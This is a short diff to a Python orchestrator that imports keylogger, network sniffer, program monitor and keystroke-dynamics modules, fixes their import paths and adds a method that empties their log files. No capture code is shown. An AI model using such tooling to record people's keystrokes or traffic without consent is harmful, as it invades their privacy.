@@ -1,12 +1,12 @@
 import os
 import sys
 from pathlib import Path
-from modules.error_detection.main import ErrorDetection
-from modules.keylogger.main import Keylogger
+from Client.modules.error_detection.error_detection import ErrorDetection
+from Client.modules.keylogger.keylogger import Keylogger
 from modules.paperclip.main import Paperclip
-from modules.program_monitor.main import ProgramMonitor
-from modules.sniffer.main import Sniffer
-from modules.svm_keystroke_dym.main import KeystrokeSVM
+from Client.modules.program_monitor.program_monitor import ProgramMonitor
+from Client.modules.sniffer.sniffer import Sniffer
+from Client.modules.svm_keystroke_dym.svm_keystroke import KeystrokeSVM
 import threading
 import ctypes
 import re
@@ -237,6 +237,28 @@ class Orchestrator:
                 combined_log.write(f"[{timestamp}][{modulo}] {text}\n")
 
         print(f"[OK] Logs combinados y ordenados en {combined_log_path}")
+
+    def clear_logs(self):
+        log_files = [
+            self.error_detection.log_path,
+            self.keylogger.log_path,
+            self.paperclip.log_path,
+            self.program_monitor.log_path,
+            self.sniffer.log_path,
+            self.keystroke_svm.log_path
+        ]
+
+        for log_file in log_files:
+            if log_file.exists():
+                try:
+                    with log_file.open("w", encoding="utf-8"):
+                        pass
+                    print(f"[OK] Archivo de log vaciado: {log_file}")
+                except Exception as e:
+                    print(f"[ERROR] No se pudo vaciar {log_file}: {e}")
+            else:
+                print(f"[AVISO] El archivo {log_file} no existe. Omitiendo...")
+    
 
 if __name__ == "__main__":
     try:
